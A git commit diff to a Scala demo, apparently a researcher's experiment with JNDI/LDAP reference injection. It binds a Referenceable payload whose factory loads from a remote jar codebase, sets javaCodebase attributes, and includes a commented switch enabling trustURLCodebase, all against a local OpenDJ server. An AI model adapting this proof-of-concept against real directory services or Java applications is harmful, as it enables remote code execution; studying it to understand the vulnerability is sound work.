2f6a152be7659937bf28c5fe999ec3157fbee3b1
Andrey Smirnov <andrey.smirnov@onefactor.com>
2021-12-16 16:00:03 +0300

    ldap bound object with remote javaCodebase lookup vulnerability

--- scalademo/src/main/scala/example/io/LdapDemo.scala
+++ scalademo/src/main/scala/example/io/LdapDemo.scala
@@ -8,6 +8,9 @@ import javax.naming.{Context, Name, Reference, Referenceable, StringRefAddr}
 import javax.naming.directory.{BasicAttributes, DirContext, InitialDirContext}
 import javax.naming.spi.ObjectFactory
 
+// docker run --rm --env ADD_BASE_ENTRY="--addBaseEntry" --env BASE_DN="dc=springrecipes,dc=com" -h localhost -p 1389:1389 -p 1636:1636 -p 4444:4444 --name ldap-01 openidentityplatform/opendj
+// docker exec ldap-01 /opt/opendj/bin/import-ldif -h localhost -p 1636 -w password -l /test.ldif -D 'cn=Directory Manager' -b dc=springrecipes,dc=com --trustAll
+
 /*
 class Payload extends Serializable {
   println("payload loaded")
@@ -36,20 +39,20 @@ class RererenceablePayloadFactory extends ObjectFactory {
 }
  */
 
-/*
 class ReferenceablePayload extends Referenceable {
   override def getReference(): Reference = {
     new Reference(
       getClass.getName,
       new StringRefAddr("command", ""),
-      "example.io.RererenceablePayloadFactory",
-      "http://localhost/scala-demo-0.1.0-SNAPSHOT.jar")
+      "example.io.RererenceablePayloadFactory1",
+      "http://localhost/scala-demo-0.1.0-SNAPSHOT2.jar")
   }
 }
- */
 
 object LdapDemo {
   def main(args: Array[String]): Unit = {
+    // System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true")
+
     val env = new util.Hashtable[String, String]()
     env.put(Context.SECURITY_PRINCIPAL, "cn=Directory Manager")
     env.put(Context.SECURITY_CREDENTIALS, "password")
@@ -71,18 +74,15 @@ object LdapDemo {
     // TODO convert to referenceable payload
     // val marshalledPayload = new MarshalledObject(payload)
     // context.rebind("cn=MarshalledPayload01", marshalledPayload)
-    // context.rebind("cn=RemotePayload", payload)
-    // context.rebind("cn=ReferenceablePayload", new ReferenceablePayload())
+    // context.rebind("cn=Payload", urlClassLoader.loadClass("example.io.Payload").newInstance())
+
+    val referenceablePayloadObj = urlClassLoader
+      .loadClass("example.io.ReferenceablePayload")
+      .newInstance()
+    // context.rebind("cn=ReferenceablePayload", referenceablePayloadObj)
+    context.rebind("cn=ReferenceablePayload", new ReferenceablePayload())
     // context.rebind("cn=ReferencePayload", new ReferenceablePayload().getReference())
 
-    val bindAttrs = new BasicAttributes(true)
-    bindAttrs.put("javaCodebase", payloadJarUrl.toString)
-
-    val plantedPayload = initialContext
-      .lookup("ldap://localhost:1389/cn=MarshalledPayload01,dc=springrecipes,dc=com")
-      .asInstanceOf[MarshalledObject[_]]
-    println("planted payload class: " + plantedPayload.getClass)
-    println("received payload: " + plantedPayload)
 
     val entries = context.list("")
 
@@ -93,7 +93,7 @@ object LdapDemo {
       // val obj = context.lookup(entry.getName)
     }
 
-    val payloadAttrs = context.getAttributes("cn=ReferencePayload")
+    val payloadAttrs = context.getAttributes("cn=Payload")
     // println("payload attrs: " + payloadAttrs)
 
     val payloadAttrsEnum = payloadAttrs.getAll
@@ -102,11 +102,14 @@ object LdapDemo {
       println("payload attr: " + attr)
     }
 
-    val referenceablePayload = context.lookup("cn=ReferencePayload")
+    val referenceablePayload = context.lookup("cn=Payload")
     println("referenceable payload: " + referenceablePayload)
 
-    // context.modifyAttributes("cn=RemotePayload", DirContext.REMOVE_ATTRIBUTE, bindAttrs)
-    // context.modifyAttributes("cn=RemotePayload", DirContext.ADD_ATTRIBUTE, bindAttrs)
+    val bindAttrs = new BasicAttributes(true)
+    bindAttrs.put("javaCodebase", payloadJarUrl.toString)
+
+    // context.modifyAttributes("cn=Payload", DirContext.REMOVE_ATTRIBUTE, bindAttrs)
+    // context.modifyAttributes("cn=Payload", DirContext.ADD_ATTRIBUTE, bindAttrs)
 
     // val attrs = context.getAttributes("o=example")
     // val attrsEnum = attrs.getAll
